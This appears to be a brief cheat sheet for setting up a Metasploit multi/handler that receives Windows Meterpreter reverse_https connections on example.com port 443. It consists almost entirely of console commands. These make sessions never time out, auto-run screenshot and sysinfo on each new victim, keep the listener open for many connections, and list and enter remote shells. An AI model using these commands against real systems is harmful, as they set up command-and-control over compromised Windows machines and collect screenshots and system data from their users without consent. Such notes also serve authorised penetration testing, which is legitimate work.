## Multi Handler

### Run metasploit multi handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST example.com
set LPORT 443
```

### Session will never timeout

```bash
set SessionCommunicationTimeout 0
```

### Execute commands on new session connection

```bash
set autorunscript multi_console_command -cl "screenshot","sysinfo"
```

### Don’t exit once the first meterpreter connection is established

```bash
set ExitOnSession false
```

### Run all meterpreter connections in the background automatically

```bash
exploit -j
```

### List sessions

```bash
sessions -l
```

### Interact with a shell

```bash
sessions -i 5
```

### Send interaction with session 5 to background

Press ctrl+z
